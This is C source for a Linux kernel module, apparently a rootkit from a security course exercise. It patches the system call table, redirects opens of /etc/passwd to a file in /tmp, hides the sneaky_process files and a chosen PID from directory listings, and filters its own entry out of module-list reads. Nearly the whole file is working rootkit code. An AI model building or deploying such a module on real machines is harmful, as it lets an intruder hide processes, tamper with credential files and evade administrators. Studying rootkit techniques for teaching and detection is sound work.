#include <linux/module.h> // for all modules
#include <linux/init.h>   // for entry/exit macros
#include <linux/kernel.h> // for printk and other kernel bits
#include <asm/current.h>  // process information
#include <linux/sched.h>
#include <linux/highmem.h> // for changing page permissions
#include <asm/unistd.h>    // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>

// This is a pointer to the system call table
static unsigned long *sys_call_table;

static char *sneakyPID = "";

// char *previousReadBuffer = NULL;
// size_t previousReadBufferSize = 0;
// Global flag
bool sneakyModFound = false;

// for pass in pid
module_param(sneakyPID, charp, 0000);
MODULE_PARM_DESC(sneakyPID, "PID for sneaky process");

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr)
{
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW)
  {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr)
{
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  char *path = (char *)regs->si;

  if (strcmp(path, "/etc/passwd") == 0)
  {
    // The new path to redirect to
    const char *new_path = "/tmp/passwd";
    copy_to_user(path, new_path, strlen(new_path));
  }

  // Call the original syscall
  return (*original_openat)(regs);
}

// sneaky_sys_getdents64
asmlinkage int (*original_getdents64)(struct pt_regs *);
asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
{
  // printk(KERN_INFO "sneakyPID in sneaky_sys_getdents64:%s\n", sneakyPID);

  struct linux_dirent64 *dirent = (struct linux_dirent64 *)regs->si;
  // for calulating usage
  struct linux_dirent64 *head = (struct linux_dirent64 *)regs->si;

  int nread = original_getdents64(regs);

  if (nread < 0)
  {
    return nread;
  }

  if (nread == 0)
  {
    return nread;
  }

  // sample code from https://linux.die.net/man/2/getdents64
  int curTotalLen = 0;
  int bpos = 0;

  while (bpos < nread)
  {

    curTotalLen = curTotalLen + dirent->d_reclen;
    if (strcmp(dirent->d_name, "sneaky_process.c") == 0)
    {
      void *src = (void *)dirent + dirent->d_reclen;
      int len = nread - curTotalLen;
      memmove(dirent, src, len);
    }
    else if (strcmp(dirent->d_name, "sneaky_process") == 0)
    {
      void *src = (void *)dirent + dirent->d_reclen;
      int len = nread - curTotalLen;
      memmove(dirent, src, len);
    }
    else if (strcmp(dirent->d_name, sneakyPID) == 0)
    {
      void *src = (void *)dirent + dirent->d_reclen;
      int len = nread - curTotalLen;
      memmove(dirent, src, len);
    }
    else
    {
      bpos = bpos + dirent->d_reclen;
      dirent = (struct linux_dirent64 *)((char *)head + bpos);
    }
  }

  return nread;
}

asmlinkage ssize_t (*original_read)(struct pt_regs *);
asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs)
{
  char *userBuf = (char *)regs->si;
  ssize_t nread = original_read(regs);
  if (nread <= 0)
  {
    return nread;
  }

  char *startPtr = strstr(userBuf, "sneaky_mod ");

  // find the buffer
  if (startPtr && startPtr == userBuf)
  {
    // find the line and remove it, then return new size
    ssize_t newSize = 0;
    char *endPtr = strchr(startPtr, '\n');
    if (endPtr)
    {
      newSize = nread - (ssize_t)(endPtr + 1 - startPtr);
      memmove(startPtr, endPtr + 1, (userBuf + nread - endPtr - 1));
    }
    // default assume that sneak_mod line would exist in one read time
    else
    {
      return nread;
      // // temp_buffer[start_of_line - temp_buffer] = '\0'; // Cut off from start
      // *start_of_line = '\0';
      // new_size = 0;
    }
    return newSize;
  }
  return nread;
}

// char *kernelBuffer;
// // kmalloc current read buffer in kernel
// kernelBuffer = kmalloc(nread + 1, GFP_KERNEL);
// // err handle
// if (!kernelBuffer)
// {
//   return nread;
// }

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  printk(KERN_INFO "openat:%d getdents:%d.\n", __NR_openat, __NR_getdents64);
  printk(KERN_INFO "sneakyPID:%s\n", sneakyPID);

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];

  original_getdents64 = (void *)sys_call_table[__NR_getdents64];

  original_read = (void *)sys_call_table[__NR_read];
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // You need to replace other system calls you need to hack here
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;

  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;

  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void)
{
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;

  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;

  sys_call_table[__NR_read] = (unsigned long)original_read;
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
MODULE_LICENSE("GPL");